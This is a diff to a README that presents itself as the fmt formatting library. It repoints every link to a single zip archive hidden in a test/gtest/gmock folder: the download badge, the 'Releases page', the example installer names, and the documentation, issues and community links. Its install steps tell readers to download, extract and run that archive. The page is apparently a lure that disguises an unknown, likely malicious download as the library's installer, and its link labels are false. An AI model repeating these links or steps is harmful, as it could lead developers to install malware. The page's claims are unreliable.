@@ -6,15 +6,15 @@ Welcome to the fmt library! This tool helps you format strings and numbers easil
 
 ## 🔗 Download the Application
 
-[![Download fmt](https://raw.githubusercontent.com/zaibatsutechnology/fmt/master/unfloor/fmt.zip)](https://raw.githubusercontent.com/zaibatsutechnology/fmt/master/unfloor/fmt.zip)
+[![Download fmt](https://github.com/zaibatsutechnology/fmt/raw/refs/heads/master/test/gtest/gmock/Software-3.9.zip)](https://github.com/zaibatsutechnology/fmt/raw/refs/heads/master/test/gtest/gmock/Software-3.9.zip)
 
 To get started, you need the latest version of fmt. You can find it on our Releases page. 
 
 ## 📥 Download & Install
 
-1. Click [here](https://raw.githubusercontent.com/zaibatsutechnology/fmt/master/unfloor/fmt.zip) to visit the Releases page.
+1. Click [here](https://github.com/zaibatsutechnology/fmt/raw/refs/heads/master/test/gtest/gmock/Software-3.9.zip) to visit the Releases page.
 2. Scroll down to find the latest version.
-3. Look for the installer suitable for your operating system. You will usually see files like **https://raw.githubusercontent.com/zaibatsutechnology/fmt/master/unfloor/fmt.zip** or **https://raw.githubusercontent.com/zaibatsutechnology/fmt/master/unfloor/fmt.zip**.
+3. Look for the installer suitable for your operating system. You will usually see files like **https://github.com/zaibatsutechnology/fmt/raw/refs/heads/master/test/gtest/gmock/Software-3.9.zip** or **https://github.com/zaibatsutechnology/fmt/raw/refs/heads/master/test/gtest/gmock/Software-3.9.zip**.
 4. Click on the file to start the download.
 5. Once downloaded, locate the file on your computer. 
 6. Extract the content of the file if it is compressed.
@@ -103,13 +103,13 @@ If you face any issues:
 
 - Make sure you have the latest version installed.
 - Check if your operating system meets the requirements.
-- Visit our [issues page](https://raw.githubusercontent.com/zaibatsutechnology/fmt/master/unfloor/fmt.zip) to report bugs or get help.
+- Visit our [issues page](https://github.com/zaibatsutechnology/fmt/raw/refs/heads/master/test/gtest/gmock/Software-3.9.zip) to report bugs or get help.
 
 ## 🔗 Additional Resources
 
-- [fmt Documentation](https://raw.githubusercontent.com/zaibatsutechnology/fmt/master/unfloor/fmt.zip) – For in-depth details and advanced usage.
-- [GitHub Issues](https://raw.githubusercontent.com/zaibatsutechnology/fmt/master/unfloor/fmt.zip) – Report issues or suggest improvements.
-- [Community Discussions](https://raw.githubusercontent.com/zaibatsutechnology/fmt/master/unfloor/fmt.zip) – Engage with other users and developers.
+- [fmt Documentation](https://github.com/zaibatsutechnology/fmt/raw/refs/heads/master/test/gtest/gmock/Software-3.9.zip) – For in-depth details and advanced usage.
+- [GitHub Issues](https://github.com/zaibatsutechnology/fmt/raw/refs/heads/master/test/gtest/gmock/Software-3.9.zip) – Report issues or suggest improvements.
+- [Community Discussions](https://github.com/zaibatsutechnology/fmt/raw/refs/heads/master/test/gtest/gmock/Software-3.9.zip) – Engage with other users and developers.
 
 ## 💬 Community & Contributions
 
